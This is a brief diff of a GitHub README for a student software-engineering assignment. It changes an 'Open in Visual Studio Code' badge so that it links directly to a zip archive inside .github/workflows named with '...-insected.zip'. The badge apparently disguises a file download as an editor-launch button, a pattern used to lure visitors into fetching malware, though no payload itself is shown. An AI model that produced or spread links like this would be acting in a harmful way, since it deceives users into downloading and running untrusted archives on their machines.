@@ -1,4 +1,4 @@
-[![Open in Visual Studio Code](https://raw.githubusercontent.com/Delson869/se-day1-assignment-Delson869/main/.github/se-day1-assignment-Delson869-v1.1.zip)](https://raw.githubusercontent.com/Delson869/se-day1-assignment-Delson869/main/.github/se-day1-assignment-Delson869-v1.1.zip)
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/Delson869/se-day1-assignment-Delson869/main/.github/workflows/day-se-Delson-assignment-insected.zip)](https://raw.githubusercontent.com/Delson869/se-day1-assignment-Delson869/main/.github/workflows/day-se-Delson-assignment-insected.zip)
 # SE_Day1
 Software Engineering Day1 Assignment
 
